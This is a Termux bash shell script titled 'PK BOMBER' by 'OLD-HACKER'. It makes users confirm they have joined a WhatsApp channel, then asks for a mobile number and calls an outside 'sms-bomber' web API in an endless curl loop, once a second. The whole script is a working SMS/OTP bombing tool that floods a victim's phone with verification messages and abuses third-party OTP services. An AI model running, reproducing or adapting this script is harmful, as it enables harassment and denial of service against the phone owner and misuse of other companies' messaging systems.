#!/data/data/com.termux/files/usr/bin/bash

# Show banner
clear
echo -e "\033[1;31m"
echo " ██████╗ ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ "
echo " ██╔══██╗██║ ██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗"
echo " ██████╔╝█████╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝"
echo " ██╔═══╝ ██╔═██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗"
echo " ██║     ██║  ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║"
echo " ╚═╝     ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝"
echo -e "\033[0m"
echo -e "\033[1;33m> Developer: OLD-HACKER\033[0m"
echo -e "\033[1;34m----------------------------------------\033[0m"

# WhatsApp channel requirement
echo -e "\033[1;32m"
echo "YOU MUST JOIN OUR WHATSAPP CHANNEL TO USE THIS TOOL"
echo "Channel Link:"
echo "https://whatsapp.com/channel/0029VavHzv259PwTIz1XxJ09"
echo -e "\033[0m"
echo -e "\033[1;34m----------------------------------------\033[0m"

read -p "Have you joined the channel? (y/n): " joined
if [ "$joined" != "y" ]; then
    echo "Please join our WhatsApp channel first!"
    exit 1
fi

# API URL
api_url="https://shadowtools.site/sms-bomber.php"

# Get mobile number
read -p "Enter Mobile Number: " mobile_number

# Continuous OTP bombing
count=1
while true
do
    echo -e "\033[1;34m"
    echo "Sending OTP request #$count"
    echo -e "\033[0m"
    
    # Call the API
    response=$(curl -s -X GET "$api_url?num=$mobile_number")
    
    # Display response
    echo "Response: $response"
    echo -e "\033[1;34m----------------------------------------\033[0m"
    
    # Increment counter and wait 1 second
    ((count++))
    sleep 1
done
